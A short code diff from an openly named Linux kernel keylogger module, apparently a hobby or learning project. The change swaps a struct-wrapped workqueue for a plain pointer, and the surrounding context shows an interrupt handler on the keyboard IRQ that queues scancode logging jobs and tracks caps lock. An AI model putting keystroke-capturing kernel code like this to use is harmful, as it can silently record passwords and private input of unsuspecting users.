@@ -329,12 +329,7 @@ static struct key_log_entry *key_create_entry(struct key_map *key)
  *	- SpinLock -> dosent works, dont know why
  */
 
-struct key_work {
-	struct workqueue_struct *work;
-	struct key_map		*key;
-};
-
-static struct key_work		 workqueue;
+static struct workqueue_struct	*workqueue;
 
 struct key_task {
 	struct work_struct	task;
@@ -374,7 +369,7 @@ static irqreturn_t	key_handler(int irq, void *dev_id)
 		if (task->scancode == SCANCODE_CAPS)
 			caps_lock = !caps_lock;
 		INIT_WORK(&task->task, key_job);
-		queue_work(workqueue.work, &task->task);
+		queue_work(workqueue, &task->task);
 	}
 	return IRQ_HANDLED;
 }
@@ -415,8 +410,8 @@ static void		__exit keylogger_clean(void)
 	key_log_print_unified();
 	free_irq(KEYBOARD_IRQ, &key_handler);
 	misc_deregister(&dev);
-	flush_workqueue(workqueue.work);
-	destroy_workqueue(workqueue.work);
+	flush_workqueue(workqueue);
+	destroy_workqueue(workqueue);
 	key_log_clean();
 	mutex_unlock(&lock);
 }
@@ -442,8 +437,7 @@ static int		__init hello_init(void)
 		free_irq(KEYBOARD_IRQ, &key_handler);
 		return 1;
 	}
-	workqueue.work = create_workqueue("keylogger");
-	workqueue.key = NULL;
+	workqueue = create_workqueue("keylogger");
 	return 0;
 }
 
